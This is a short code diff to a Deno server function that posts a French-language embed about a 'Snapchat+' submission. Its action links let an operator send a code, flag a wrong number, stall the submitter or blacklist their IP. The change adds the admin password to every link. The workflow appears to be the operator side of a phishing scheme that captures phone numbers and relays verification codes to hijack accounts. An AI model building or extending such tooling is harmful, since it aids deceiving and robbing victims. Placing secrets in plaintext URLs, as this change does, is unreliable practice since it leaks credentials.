@@ -43,6 +43,7 @@ Deno.serve(async (req) => {
   });
 
   const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
+  const expectedSecret = Deno.env.get("ADMIN_PASSWORD") || "";
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -59,7 +60,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [Envoyer le code](${appUrl}/?trigger=${submissionId})\n❌ [Mauvais numéro](${appUrl}/?action=wrong&id=${submissionId})\n⏳ [Faire patienter](${appUrl}/?action=wait&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${finalIp})`,
+        value: `✅ [Envoyer le code](${appUrl}/?trigger=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n❌ [Mauvais numéro](${appUrl}/?action=wrong&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n⏳ [Faire patienter](${appUrl}/?action=wait&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${finalIp}&s=${encodeURIComponent(expectedSecret)})`,
         inline: false,
       },
     ],
